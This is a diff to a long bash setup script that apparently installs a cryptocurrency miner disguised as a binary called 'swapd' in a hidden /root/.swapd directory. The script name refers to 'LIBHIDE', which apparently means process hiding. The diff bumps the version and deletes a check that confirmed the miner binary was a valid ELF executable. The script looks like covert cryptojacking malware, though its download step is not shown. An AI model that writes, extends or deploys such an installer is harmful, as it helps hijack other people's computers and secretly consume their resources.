@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="3.6"
-readonly BUILD_DATE="2026-03-14 23:51:56 UTC"
+readonly SCRIPT_VERSION="3.7"
+readonly BUILD_DATE="2026-03-15 01:41:30 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -2591,22 +2591,6 @@ if [ "$DOWNLOAD_SUCCESS" = false ]; then
     echo "  4. Make executable: chmod +x /root/.swapd/swapd"
     echo "  5. Re-run this script"
     echo ""
-    exit 1
-fi
-
-# Verify swapd exists and is actually executable (not just an empty file)
-if [ -f swapd ] && [ -s swapd ]; then
-    # Check if it's a valid ELF binary (executable or PIE shared object)
-    if file swapd | grep -qE "ELF.*(executable|shared object)"; then
-        echo "[✓] Miner binary ready as 'swapd'"
-        ls -lh swapd
-    else
-        echo "[!] ERROR: swapd exists but is not a valid executable binary!"
-        file swapd
-        exit 1
-    fi
-else
-    echo "[!] ERROR: swapd binary not created or is empty!"
     exit 1
 fi
 
